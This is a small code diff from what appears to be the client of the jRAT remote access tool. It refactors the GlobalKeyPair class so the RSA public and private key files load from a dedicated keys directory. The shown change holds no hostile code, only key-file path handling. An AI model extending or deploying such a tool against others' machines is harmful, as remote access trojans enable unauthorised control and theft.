@@ -1,6 +1,6 @@
 package io.jrat.client.crypto;
 
-import io.jrat.client.io.Files;
+import io.jrat.client.Globals;
 import io.jrat.client.utils.IOUtils;
 import io.jrat.common.Logger;
 import io.jrat.common.crypto.Crypto;
@@ -18,8 +18,8 @@ public class GlobalKeyPair {
 	private static KeyPair global;
 	
 	public static void initialize() throws Exception {
-		File pubKeyFile = new File(Files.getFiles(), "public.key");
-		File privKeyFile = new File(Files.getFiles(), "private.key");
+		File pubKeyFile = new File(Globals.getRSAKeysDirectory(), "public.key");
+		File privKeyFile = new File(Globals.getRSAKeysDirectory(), "private.key");
 		
 		PublicKey publicKey;
 		PrivateKey privateKey;
